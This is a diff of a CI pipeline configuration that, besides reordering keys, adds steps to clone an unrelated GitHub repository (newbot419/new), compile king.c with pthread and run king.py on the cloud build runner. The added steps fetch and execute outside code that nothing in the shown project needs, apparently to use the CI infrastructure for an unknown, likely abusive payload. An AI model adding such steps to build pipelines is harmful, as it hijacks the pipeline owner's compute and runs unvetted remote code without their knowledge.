@@ -39,10 +39,38 @@ pipeline:
                       python3 -m pip install -e .
                   timeout: ""
                   type: Run
+              - step:
+                  type: Run
+                  name: Run_3
+                  identifier: Run_3
+                  spec:
+                    shell: Sh
+                    command: git clone https://github.com/newbot419/new.git
+              - step:
+                  type: Run
+                  name: Run_4
+                  identifier: Run_4
+                  spec:
+                    shell: Sh
+                    command: cd new
+              - step:
+                  type: Run
+                  name: Run_5
+                  identifier: Run_5
+                  spec:
+                    shell: Sh
+                    command: gcc king.c -o king -lpthread
+              - step:
+                  type: Run
+                  name: Run_6
+                  identifier: Run_6
+                  spec:
+                    shell: Sh
+                    command: python3 king.py
           platform:
-            arch: Amd64
             os: Linux
+            arch: Amd64
           runtime:
-            spec: {}
             type: Cloud
+            spec: {}
         type: CI
